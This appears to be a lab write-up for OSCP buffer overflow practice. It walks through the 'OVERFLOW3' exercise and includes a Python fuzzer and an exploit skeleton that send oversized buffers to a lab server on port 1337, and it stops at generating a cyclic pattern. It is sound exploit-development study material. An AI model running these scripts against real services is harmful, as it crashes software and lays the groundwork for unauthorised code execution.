---
description: OSCP.exe
---

# OVERFLOW3

## Methodology

1\. Spiking or Playing with the program

2\. Fuzzing

3\. Controlling the EIP

4\. Finding Bad Characters

5\. Finding a Jump Point

6\. Generating a Payload

7\. "NOP Sledding"

8\. Exploitation

## Spiking or Playing

* Opened up the vulnerable program in Immunity
* Ran the program
* Noticed in Command Prompt that it is running a server on 1337
* Connected to the program via Netcat to see the inner workings of the program

## Mona Configuration

Place the following into the debugger window of Immunity:

```
!mona config -set workingfolder c:\mona\%p
```

## Fuzzing

<mark style="color:yellow;">Fuzzer.py</mark>

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.49.118"

port = 1337
timeout = 5
prefix = "OVERFLOW3 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

* Run the fuzzer and note the bytes it crashes at
* Fuzzing crashed at <mark style="color:yellow;">1300</mark> bytes

## Crash Replication and Controlling EIP

Exploit.py

```
import socket

ip = "10.10.49.118"
port = 1337

prefix = "OVERFLOW3 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

### msf-pattern\_create

* We now need to generate a program that is a length of 300 bytes longer than the string that crashed the program
* This is because we need to make room for the payload in memory
* <mark style="color:yellow;">1600</mark> bytes should do the trick
